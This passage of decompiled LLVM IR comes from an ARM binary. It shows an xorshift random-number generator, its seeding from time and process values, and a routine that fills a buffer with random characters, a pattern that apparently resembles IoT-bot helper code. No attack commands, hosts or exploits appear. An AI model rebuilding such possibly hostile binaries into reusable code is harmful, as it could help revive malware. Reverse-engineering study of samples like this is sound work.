  %v3_ed4c = load i32, i32* %stack_var_-48, align 4
  %v3_ed58 = call i32 @function_15c58(i32 1, i32 %v3_ed48, i32 %v3_ed4c)
  %v3_ed68 = call i32 @function_15c58(i32 1, i32 ptrtoint (i32* @global_var_197f8.152 to i32), i32 1)
  %v1_ed70 = call i32 @function_119f4(i32 2)
  %v0_ed74 = call i32 @function_14c4c()
  %v1_ed78 = load i32, i32* @r6, align 4
  store i32 %v9_eb2c, i32* %r6.global-to-local, align 4
  ret i32 %v1_ed78

dec_label_pc_ed94:                                ; preds = %dec_label_pc_ebd0
  %v0_ed9c = load i32, i32* @r8, align 4
  %v1_eda8 = inttoptr i32 %v0_ed9c to i8*
  %v2_eda8 = call i32 @function_12324(i8* %v1_eda8)
  %v2_edb4 = call i32 @function_12b60(i32 2, i32 %v2_eda8)
  %v0_edc0 = load i32, i32* @r8, align 4
  %v2_edc4 = add i32 %v0_edc0, %v2_eda8
  %v3_edc4 = inttoptr i32 %v2_edc4 to i8*
  %v4_edc4 = load i8, i8* %v3_edc4, align 1
  %v6_edc4 = zext i8 %v4_edc4 to i32
  store i32 %v6_edc4, i32* @r4, align 4
  %v1_edd0 = inttoptr i32 %v0_edc0 to i8*
  %v2_edd0 = call i32 @function_12324(i8* %v1_edd0)
  %v2_eddc = call i32 @function_12b60(i32 4, i32 %v2_edd0)
  %v0_ede8 = load i32, i32* @r8, align 4
  %v2_edec = add i32 %v0_ede8, %v2_edd0
  %v3_edec = inttoptr i32 %v2_edec to i8*
  %v4_edec = load i8, i8* %v3_edec, align 1
  %v6_edec = zext i8 %v4_edec to i32
  store i32 %v6_edec, i32* @r7, align 4
  %v1_edf8 = inttoptr i32 %v0_ede8 to i8*
  %v2_edf8 = call i32 @function_12324(i8* %v1_edf8)
  %v2_ee04 = call i32 @function_12b60(i32 6, i32 %v2_edf8)
  %v0_ee10 = load i32, i32* @r8, align 4
  %v2_ee14 = add i32 %v0_ee10, %v2_edf8
  %v3_ee14 = inttoptr i32 %v2_ee14 to i8*
  %v4_ee14 = load i8, i8* %v3_ee14, align 1
  %v6_ee14 = zext i8 %v4_ee14 to i32
  store i32 %v6_ee14, i32* %r6.global-to-local, align 4
  %v1_ee20 = inttoptr i32 %v0_ee10 to i8*
  %v2_ee20 = call i32 @function_12324(i8* %v1_ee20)
  %v2_ee2c = call i32 @function_12b60(i32 8, i32 %v2_ee20)
  %v0_ee38 = load i32, i32* @r8, align 4
  %v2_ee3c = add i32 %v0_ee38, %v2_ee20
  %v3_ee3c = inttoptr i32 %v2_ee3c to i8*
  %v4_ee3c = load i8, i8* %v3_ee3c, align 1
  %v6_ee3c = zext i8 %v4_ee3c to i32
  store i32 %v6_ee3c, i32* @r5, align 4
  %v1_ee48 = inttoptr i32 %v0_ee38 to i8*
  %v2_ee48 = call i32 @function_12324(i8* %v1_ee48)
  %v2_ee54 = call i32 @function_12b60(i32 10, i32 %v2_ee48)
  %v0_ee58 = load i32, i32* @r4, align 4
  %v1_ee58 = urem i32 %v0_ee58, 256
  %v0_ee60 = load i32, i32* @r7, align 4
  %v1_ee60 = urem i32 %v0_ee60, 256
  %v1_ee64 = xor i32 %v1_ee60, 255
  store i32 %v1_ee64, i32* @r7, align 4
  %v0_ee68 = load i32, i32* %r6.global-to-local, align 4
  %v1_ee6c = sub nsw i32 174, %v1_ee58
  %v1_ee68 = urem i32 %v0_ee68, 256
  %v1_ee70 = xor i32 %v1_ee68, 255
  store i32 %v1_ee70, i32* @r6, align 4
  %v0_ee74 = load i32, i32* @r5, align 4
  %v1_ee74 = sub i32 -1, %v0_ee74
  %v2_ee78 = add nsw i32 %v1_ee64, %v1_ee6c
  %v0_ee7c = load i32, i32* @r8, align 4
  %v2_ee7c = add i32 %v0_ee7c, %v2_ee48
  %v3_ee7c = inttoptr i32 %v2_ee7c to i8*
  %v4_ee7c = load i8, i8* %v3_ee7c, align 1
  %v6_ee7c = zext i8 %v4_ee7c to i32
  %v2_ee84 = add nsw i32 %v1_ee70, %v2_ee78
  %v1_ee94 = sub nuw nsw i32 -1, %v6_ee7c
  %fold15 = add i32 %v2_ee84, %v1_ee74
  %v1_ee98 = urem i32 %fold15, 256
  %v2_eea0 = add nsw i32 %v1_ee98, %v1_ee94
  store i32 %v2_eea0, i32* @r4, align 4
  %v1_eeac = inttoptr i32 %v0_ee7c to i8*
  %v2_eeac = call i32 @function_12324(i8* %v1_eeac)
  %v2_eeb8 = call i32 @function_12b60(i32 12, i32 %v2_eeac)
  %v0_eebc = load i32, i32* @r8, align 4
  %v2_eebc = add i32 %v0_eebc, %v2_eeac
  %v3_eebc = inttoptr i32 %v2_eebc to i8*
  %v4_eebc = load i8, i8* %v3_eebc, align 1
  %v6_eebc = zext i8 %v4_eebc to i32
  %v0_eec0 = load i32, i32* @r4, align 4
  %v1_eec4 = sub nuw nsw i32 -1, %v6_eebc
  %fold = add i32 %v0_eec0, %v1_eec4
  %v1_eed0 = urem i32 %fold, 256
  %v3_eed8 = udiv i32 %v1_eed0, 9
  %v2_eee4 = sub i32 %fold, %v3_eed8
  %v2_eeec = ptrtoint i32* %stack_var_-40 to i32
  %v1_eee8 = mul i32 %v2_eee4, 4
  %v3_eef0 = and i32 %v1_eee8, 1020
  %v2_eef8 = add i32 %v3_eef0, %v2_eeec
  %v2_eefc = ptrtoint i8* %stack_var_-76 to i32
  store i32 %v2_eefc, i32* @r5, align 4
  %v1_ef00 = add i32 %v2_eef8, -172
  %v2_ef00 = inttoptr i32 %v1_ef00 to i32*
  %v3_ef00 = load i32, i32* %v2_ef00, align 4
  store i32 61196, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_ef00)
  %v0_ef10 = load i32, i32* @r8, align 4
  %v2_ef14 = inttoptr i32 %v0_ef10 to i8*
  %v3_ef14 = call i32 @function_12710(i8* %v2_ef14, i32 %v2_eefc)
  store i32 %v3_ef14, i32* @r4, align 4
  %v2_ef24 = call i32 @function_123b8(i32 %v2_ec08, i32 18)
  %v2_ef30 = call i32 @function_123b8(i32 %v2_eefc, i32 12)
  %v0_ef34 = load i32, i32* @r4, align 4
  %v2_ef34 = icmp eq i32 %v0_ef34, 0
  br i1 %v2_ef34, label %dec_label_pc_ec88, label %dec_label_pc_ef3c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ed94
  %v1_ef40 = call i32 @function_14df0(i32 5)
  br label %dec_label_pc_ec88

dec_label_pc_ef48:                                ; preds = %dec_label_pc_eb2c
  %v3_ef50 = call i32 @function_130e0(i32 ptrtoint ([19 x i8]* @global_var_197e4.155 to i32), i32 2)
  %v3_ef54 = icmp eq i32 %v3_ef50, -1
  store i32 %v3_ef50, i32* @r4, align 4
  br i1 %v3_ef54, label %dec_label_pc_ebd0, label %dec_label_pc_eba4

dec_label_pc_ef64:                                ; preds = %dec_label_pc_ec88
  %v0_ef64 = load i32, i32* @sl, align 4
  %v1_ef64 = add i32 %v0_ef64, 4
  %v2_ef64 = inttoptr i32 %v1_ef64 to i32*
  %v3_ef64 = load i32, i32* %v2_ef64, align 4
  %v1_ef68 = inttoptr i32 %v3_ef64 to i8*
  %v2_ef68 = call i32 @function_12324(i8* %v1_ef68)
  %v8_ef70 = icmp sgt i32 %v2_ef68, 31
  br i1 %v8_ef70, label %dec_label_pc_ecac, label %dec_label_pc_ef74

dec_label_pc_ef74:                                ; preds = %dec_label_pc_ef64
  %v0_ef74 = load i32, i32* @sl, align 4
  %v1_ef74 = add i32 %v0_ef74, 4
  %v2_ef74 = inttoptr i32 %v1_ef74 to i32*
  %v3_ef74 = load i32, i32* %v2_ef74, align 4
  store i32 %v2_ec8c, i32* @r0, align 4
  %v2_ef7c = bitcast i32* %stack_var_-174 to i8*
  %v3_ef7c = call i32 @function_1234c(i8* %v2_ef7c, i32 %v3_ef74)
  %v0_ef80 = load i32, i32* @sl, align 4
  %v1_ef80 = add i32 %v0_ef80, 4
  %v2_ef80 = inttoptr i32 %v1_ef80 to i32*
  %v3_ef80 = load i32, i32* %v2_ef80, align 4
  %v1_ef88 = inttoptr i32 %v3_ef80 to i8*
  %v2_ef88 = call i32 @function_12324(i8* %v1_ef88)
  %v2_ef94 = call i32 @function_123b8(i32 %v3_ef80, i32 %v2_ef88)
  br label %dec_label_pc_ecac

; uselistorder directives
  uselistorder i32 %v3_ef50, { 1, 2, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %v0_ee7c, { 1, 0 }
  uselistorder i32 %v0_ee38, { 1, 0 }
  uselistorder i32 %v0_ee10, { 1, 0 }
  uselistorder i32 %v0_ede8, { 1, 0 }
  uselistorder i32 %v0_edc0, { 1, 0 }
  uselistorder i32 %v2_ecd0, { 0, 2, 1 }
  uselistorder i32 %v2_ecbc, { 1, 0, 2 }
  uselistorder i32 %v0_ebb8, { 1, 0 }
  uselistorder i32 %v3_eb94, { 1, 2, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_12b60, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_15c58, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_1234c, { 0, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 23, 24, 25, 28, 26, 29, 27, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32 ()* @function_e928, { 1, 0 }
  uselistorder i32 ptrtoint (i16** @global_var_22918.123 to i32), { 1, 0 }
  uselistorder i32 47, { 4, 5, 0, 6, 1, 7, 2, 8, 9, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_19784.21 to i32), { 0, 3, 1, 2, 4 }
  uselistorder i32 (i32, i32)* @function_14eb8, { 1, 0 }
  uselistorder i32 (i32)* @function_15c40, { 1, 0 }
  uselistorder label %dec_label_pc_ecac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ec88, { 2, 1, 0 }
}

define i32 @function_f570() local_unnamed_addr {
dec_label_pc_f570:
  %v2_f57c = load i32, i32* @global_var_22354.168, align 4
  %v2_f580 = load i32, i32* @global_var_22360.170, align 4
  %v4_f58c = mul i32 %v2_f57c, 2048
  %v5_f58c = xor i32 %v4_f58c, %v2_f57c
  store i32 %v5_f58c, i32* @r3, align 4
  %v4_f590 = udiv i32 %v2_f580, 524288
  %v5_f590 = xor i32 %v4_f590, %v2_f580
  %v2_f594 = load i32, i32* @global_var_22358.172, align 4
  %v2_f598 = load i32, i32* @global_var_2235c.174, align 4
  store i32 %v2_f598, i32* @ip, align 4
  %v2_f59c = xor i32 %v5_f590, %v5_f58c
  %v4_f5a0 = udiv i32 %v5_f58c, 256
  %v5_f5a0 = xor i32 %v2_f59c, %v4_f5a0
  store i32 %v2_f594, i32* @global_var_22354.168, align 4
  store i32 %v2_f598, i32* @global_var_22358.172, align 4
  store i32 %v2_f580, i32* @global_var_2235c.174, align 4
  store i32 %v5_f5a0, i32* @global_var_22360.170, align 4
  ret i32 %v5_f5a0

; uselistorder directives
  uselistorder i32 %v2_f580, { 2, 1, 0 }
  uselistorder i32 %v2_f57c, { 1, 0 }
}

define i32 @function_f5cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5cc:
  %v3_f5cc = load i32, i32* @r4, align 4
  %v6_f5cc = load i32, i32* @r5, align 4
  %v2_f5d8 = call i32 @function_15ad0(i32* null)
  store i32 %v2_f5d8, i32* @r0, align 4
  store i32 %v2_f5d8, i32* @global_var_22354.168, align 4
  %v1_f5e4 = call i32 @function_15b74(i32 %v2_f5d8)
  store i32 %v1_f5e4, i32* @r0, align 4
  store i32 %v1_f5e4, i32* @r4, align 4
  %v0_f5ec = call i32 @function_15b88()
  store i32 ptrtoint (i32* @global_var_22358.172 to i32), i32* @r5, align 4
  %v1_f5f4 = load i32, i32* @r4, align 4
  %v2_f5f4 = xor i32 %v1_f5f4, %v0_f5ec
  store i32 %v2_f5f4, i32* @global_var_22358.172, align 4
  %v1_f5fc = call i32 @function_15954(i32 %v2_f5f4)
  %v2_f600 = load i32, i32* @global_var_22358.172, align 4
  %v2_f60c = xor i32 %v2_f600, %v1_f5fc
  store i32 %v2_f60c, i32* @global_var_22360.170, align 4
  store i32 %v1_f5fc, i32* @global_var_2235c.174, align 4
  store i32 %v3_f5cc, i32* @r4, align 4
  store i32 %v6_f5cc, i32* @r5, align 4
  ret i32 %v1_f5fc

; uselistorder directives
  uselistorder i32 %v1_f5fc, { 1, 2, 0 }
  uselistorder i32 ()* @function_15b88, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_15b74, { 0, 2, 1 }
}

define i32 @function_f634(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f634:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %v12_f634 = load i32, i32* @r7, align 4
  %v15_f634 = load i32, i32* @r8, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %tmp, i32* @r8, align 4
  store i32 ptrtoint ([33 x i8]* @global_var_1983c.180 to i32), i32* %r1.global-to-local, align 4
  %v2_f648 = ptrtoint i32* %stack_var_-73 to i32
  store i32 %v2_f648, i32* %r0.global-to-local, align 4
  store i32 33, i32* %r2.global-to-local, align 4
  %v4_f650 = bitcast i32* %stack_var_-73 to i16*
  %v5_f650 = call i32 @function_150f0(i16* %v4_f650, i32 ptrtoint ([33 x i8]* @global_var_1983c.180 to i32), i32 33)
  store i32 %v5_f650, i32* %r0.global-to-local, align 4
  %v0_f654 = load i32, i32* @r7, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f654 = icmp slt i32 %v0_f654, 0
  store i1 %v1_f654, i1* %cpsr_n.global-to-local, align 1
  %v2_f654 = icmp eq i32 %v0_f654, 0
  store i1 %v2_f654, i1* %cpsr_z.global-to-local, align 1
  %tmp24 = icmp slt i32 %v0_f654, 1
  br i1 %tmp24, label %dec_label_pc_f74c, label %dec_label_pc_f65c

dec_label_pc_f65c:                                ; preds = %dec_label_pc_f634
  store i32 ptrtoint (i32* @global_var_22360.170 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2235c.174 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22358.172 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22354.168 to i32), i32* %r3.global-to-local, align 4
  %v2_f66c = load i32, i32* @global_var_22360.170, align 4
  store i32 %v2_f66c, i32* %r5.global-to-local, align 4
  %v2_f670 = load i32, i32* @global_var_2235c.174, align 4
  store i32 %v2_f670, i32* %sb.global-to-local, align 4
  %v2_f674 = load i32, i32* @global_var_22358.172, align 4
  store i32 %v2_f674, i32* %sl.global-to-local, align 4
  %v2_f678 = load i32, i32* @global_var_22354.168, align 4
  store i32 %v2_f678, i32* %r0.global-to-local, align 4
  %v2_f684 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f6e8

dec_label_pc_f680:                                ; preds = %dec_label_pc_f6e8
  %v1_f680 = urem i32 %v5_f6f8, 256
  store i32 %v1_f680, i32* %r3.global-to-local, align 4
  store i32 %v2_f684, i32* %r1.global-to-local, align 4
  %v4_f688 = udiv i32 %v1_f680, 8
  %v5_f688 = add i32 %v4_f688, %v2_f684
  store i32 %v5_f688, i32* %r2.global-to-local, align 4
  %v1_f68c = add i32 %v5_f688, -33
  %v2_f68c = inttoptr i32 %v1_f68c to i8*
  %v3_f68c = load i8, i8* %v2_f68c, align 1
  %v4_f68c = zext i8 %v3_f68c to i32
  store i32 %v4_f68c, i32* %r0.global-to-local, align 4
  %v3_f690 = mul i32 %v5_f6f8, 65536
  store i32 %v3_f690, i32* %r1.global-to-local, align 4
  store i32 %v2_f684, i32* %r2.global-to-local, align 4
  %tmp25 = udiv i32 %v5_f6f8, 2048
  %v4_f698 = urem i32 %tmp25, 32
  %v5_f698 = add i32 %v4_f698, %v2_f684
  store i32 %v5_f698, i32* %r3.global-to-local, align 4
  %v1_f69c = add i32 %v5_f698, -33
  %v2_f69c = inttoptr i32 %v1_f69c to i8*
  %v3_f69c = load i8, i8* %v2_f69c, align 1
  %v4_f69c = zext i8 %v3_f69c to i32
  store i32 %v4_f69c, i32* %ip.global-to-local, align 4
  %v3_f6a0 = mul i32 %v5_f6f8, 256
  store i32 %v3_f6a0, i32* %r2.global-to-local, align 4
  %v3_f6a4 = inttoptr i32 %v0_f6fc to i8*
  store i8 %v3_f68c, i8* %v3_f6a4, align 1
  %v4_f6a4 = load i32, i32* %r6.global-to-local, align 4
  %v5_f6a4 = add i32 %v4_f6a4, 1
  store i32 %v5_f6a4, i32* %r6.global-to-local, align 4
  %v1_f6ac = load i32, i32* %r2.global-to-local, align 4
  %v4_f6ac = udiv i32 %v1_f6ac, 134217728
  %v5_f6ac = add i32 %v4_f6ac, %v2_f684
  store i32 %v5_f6ac, i32* %r1.global-to-local, align 4
  %v1_f6b0 = load i32, i32* %r4.global-to-local, align 4
  %v4_f6b0 = udiv i32 %v1_f6b0, 134217728
  %v5_f6b0 = add i32 %v4_f6b0, %v2_f684
  store i32 %v5_f6b0, i32* %r3.global-to-local, align 4
  %v1_f6b4 = add i32 %v5_f6ac, -33
  %v2_f6b4 = inttoptr i32 %v1_f6b4 to i8*
  %v3_f6b4 = load i8, i8* %v2_f6b4, align 1
  %v4_f6b4 = zext i8 %v3_f6b4 to i32
  store i32 %v4_f6b4, i32* %lr.global-to-local, align 4
  %v1_f6b8 = add i32 %v5_f6b0, -33
  %v2_f6b8 = inttoptr i32 %v1_f6b8 to i8*
  %v3_f6b8 = load i8, i8* %v2_f6b8, align 1
  %v4_f6b8 = zext i8 %v3_f6b8 to i32
  store i32 %v4_f6b8, i32* %r2.global-to-local, align 4
  %v0_f6bc = load i32, i32* @r7, align 4
  %v1_f6bc = add i32 %v0_f6bc, -4
  store i32 %v1_f6bc, i32* @r7, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f6c0 = icmp slt i32 %v1_f6bc, 0
  store i1 %v1_f6c0, i1* %cpsr_n.global-to-local, align 1
  %v2_f6c0 = icmp eq i32 %v1_f6bc, 0
  store i1 %v2_f6c0, i1* %cpsr_z.global-to-local, align 1
  %v0_f6c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_f6c4 = trunc i32 %v0_f6c4 to i8
  %v2_f6c4 = load i32, i32* @r8, align 4
  %v3_f6c4 = add i32 %v2_f6c4, 1
  %v4_f6c4 = inttoptr i32 %v3_f6c4 to i8*
  store i8 %v1_f6c4, i8* %v4_f6c4, align 1
  %v0_f6c8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_f6c8, i32* %r0.global-to-local, align 4
  %v0_f6cc = load i32, i32* @r8, align 4
  %v1_f6cc = add i32 %v0_f6cc, 4
  store i32 %v1_f6cc, i32* @r8, align 4
  %v0_f6d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f6d0 = trunc i32 %v0_f6d0 to i8
  %v2_f6d0 = load i32, i32* %r6.global-to-local, align 4
  %v3_f6d0 = add i32 %v2_f6d0, 2
  %v4_f6d0 = inttoptr i32 %v3_f6d0 to i8*
  store i8 %v1_f6d0, i8* %v4_f6d0, align 1
  %v0_f6d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_f6d4 = trunc i32 %v0_f6d4 to i8
  %v2_f6d4 = load i32, i32* %r6.global-to-local, align 4
  %v3_f6d4 = add i32 %v2_f6d4, 1
  %v4_f6d4 = inttoptr i32 %v3_f6d4 to i8*
  store i8 %v1_f6d4, i8* %v4_f6d4, align 1
  %v0_f6d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f6d8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f6d8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_f6d8 = xor i1 %v1_f6d8, %v2_f6d8
  %v4_f6d8 = or i1 %v0_f6d8, %v3_f6d8
  br i1 %v4_f6d8, label %dec_label_pc_f730, label %dec_label_pc_f680.dec_label_pc_f6dc_crit_edge

dec_label_pc_f680.dec_label_pc_f6dc_crit_edge:    ; preds = %dec_label_pc_f680
  %v0_f6e8.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f6dc

dec_label_pc_f6dc:                                ; preds = %dec_label_pc_f680.dec_label_pc_f6dc_crit_edge, %dec_label_pc_f704
  %v0_f6e8.pre = phi i32 [ %v0_f6e8.pre.pre, %dec_label_pc_f680.dec_label_pc_f6dc_crit_edge ], [ %v0_f728, %dec_label_pc_f704 ]
  %v0_f6dc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f6dc, i32* %sl.global-to-local, align 4
  %v0_f6e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_f6e0, i32* %sb.global-to-local, align 4
  %v0_f6e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f6e4, i32* %r5.global-to-local, align 4
  %v0_f6f4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f6e8

dec_label_pc_f6e8:                                ; preds = %dec_label_pc_f65c, %dec_label_pc_f6dc
  %v0_f718 = phi i32 [ %v0_f654, %dec_label_pc_f65c ], [ %v0_f6f4.pre, %dec_label_pc_f6dc ]
  %v0_f6ec = phi i32 [ %v2_f66c, %dec_label_pc_f65c ], [ %v0_f6e4, %dec_label_pc_f6dc ]
  %v0_f6e8 = phi i32 [ %v2_f678, %dec_label_pc_f65c ], [ %v0_f6e8.pre, %dec_label_pc_f6dc ]
  %v4_f6e8 = mul i32 %v0_f6e8, 2048
  %v5_f6e8 = xor i32 %v4_f6e8, %v0_f6e8
  store i32 %v5_f6e8, i32* %r3.global-to-local, align 4
  %v4_f6ec = udiv i32 %v0_f6ec, 524288
  %v5_f6ec = xor i32 %v4_f6ec, %v0_f6ec
  %v2_f6f0 = xor i32 %v5_f6ec, %v5_f6e8
  store i32 %v2_f6f0, i32* %r2.global-to-local, align 4
  %v1_f6f4 = add i32 %v0_f718, -3
  %v3_f6f4 = sub i32 2, %v0_f718
  %v4_f6f4 = and i32 %v3_f6f4, %v0_f718
  %v5_f6f4 = icmp slt i32 %v4_f6f4, 0
  store i1 %v5_f6f4, i1* %cpsr_v.global-to-local, align 1
  %v6_f6f4 = icmp slt i32 %v1_f6f4, 0
  store i1 %v6_f6f4, i1* %cpsr_n.global-to-local, align 1
  %v7_f6f4 = icmp eq i32 %v0_f718, 3
  store i1 %v7_f6f4, i1* %cpsr_z.global-to-local, align 1
  %v2_f6f8 = and i32 %v0_f6e8, 128
  %v3_f6f8 = icmp ne i32 %v2_f6f8, 0
  %v4_f6f8 = udiv i32 %v5_f6e8, 256
  %v5_f6f8 = xor i32 %v4_f6f8, %v2_f6f0
  store i32 %v5_f6f8, i32* %r4.global-to-local, align 4
  %v0_f6fc = load i32, i32* @r8, align 4
  store i32 %v0_f6fc, i32* %r6.global-to-local, align 4
  %v2_f700 = xor i1 %v7_f6f4, true
  %v3_f700 = and i1 %v3_f6f8, %v2_f700
  br i1 %v3_f700, label %dec_label_pc_f680, label %dec_label_pc_f704

dec_label_pc_f704:                                ; preds = %dec_label_pc_f6e8
  %v1_f718 = add i32 %v0_f718, -1
  store i32 %v1_f718, i32* @r7, align 4
  %v2_f714.neg = urem i32 %v5_f6f8, 33
  store i32 %v2_f714.neg, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_f720 = icmp slt i32 %v1_f718, 0
  store i1 %v1_f720, i1* %cpsr_n.global-to-local, align 1
  %v2_f720 = icmp eq i32 %v1_f718, 0
  store i1 %v2_f720, i1* %cpsr_z.global-to-local, align 1
  %v1_f724 = trunc i32 %v2_f714.neg to i8
  %v3_f724 = inttoptr i32 %v0_f6fc to i8*
  store i8 %v1_f724, i8* %v3_f724, align 1
  %v4_f724 = load i32, i32* @r8, align 4
  %v5_f724 = add i32 %v4_f724, 1
  store i32 %v5_f724, i32* @r8, align 4
  %v0_f728 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_f728, i32* %r0.global-to-local, align 4
  %v0_f72c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f72c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_f72c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_f72c = xor i1 %v1_f72c, %v2_f72c
  %v4_f72c = or i1 %v0_f72c, %v3_f72c
  br i1 %v4_f72c, label %dec_label_pc_f730, label %dec_label_pc_f6dc

dec_label_pc_f730:                                ; preds = %dec_label_pc_f704, %dec_label_pc_f680
  store i32 ptrtoint (i32* @global_var_2235c.174 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22358.172 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22354.168 to i32), i32* %r1.global-to-local, align 4
  %v0_f73c = load i32, i32* %r4.global-to-local, align 4
  %v1_f73c = load i32, i32* %fp.global-to-local, align 4
  %v2_f73c = inttoptr i32 %v1_f73c to i32*
  store i32 %v0_f73c, i32* %v2_f73c, align 4
  %v0_f740 = load i32, i32* %r5.global-to-local, align 4
  %v1_f740 = load i32, i32* %r2.global-to-local, align 4
  %v2_f740 = inttoptr i32 %v1_f740 to i32*
  store i32 %v0_f740, i32* %v2_f740, align 4
  %v0_f744 = load i32, i32* %sb.global-to-local, align 4
  %v1_f744 = load i32, i32* %r3.global-to-local, align 4
  %v2_f744 = inttoptr i32 %v1_f744 to i32*
  store i32 %v0_f744, i32* %v2_f744, align 4
  %v0_f748 = load i32, i32* %sl.global-to-local, align 4
  %v1_f748 = load i32, i32* %r1.global-to-local, align 4
  %v2_f748 = inttoptr i32 %v1_f748 to i32*
  store i32 %v0_f748, i32* %v2_f748, align 4
  %v1_f754.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f74c

dec_label_pc_f74c:                                ; preds = %dec_label_pc_f634, %dec_label_pc_f730
  %v1_f754 = phi i32 [ %v5_f650, %dec_label_pc_f634 ], [ %v1_f754.pre, %dec_label_pc_f730 ]
  store i32 %v12_f634, i32* @r7, align 4
  store i32 %v15_f634, i32* @r8, align 4
  ret i32 %v1_f754

; uselistorder directives
  uselistorder i32 %v0_f728, { 1, 0 }
  uselistorder i32 %v2_f714.neg, { 1, 0 }
  uselistorder i32 %v0_f6fc, { 1, 2, 0 }
  uselistorder i32 %v5_f6f8, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 %v0_f6e8, { 2, 1, 0 }
  uselistorder i32 %v0_f6ec, { 1, 0 }
  uselistorder i32 %v0_f718, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v2_f684, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_f654, { 0, 1, 3, 2 }
  uselistorder i32* %sl.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r6.global-to-local, { 4, 0, 1, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 4, 5, 6, 8, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_v.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i1* %cpsr_n.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_f74c, { 1, 0 }
  uselistorder label %dec_label_pc_f6e8, { 1, 0 }
  uselistorder label %dec_label_pc_f6dc, { 1, 0 }
}

define i32 @function_f770(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f770:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_f770 = load i32, i32* %r1.global-to-local, align 4
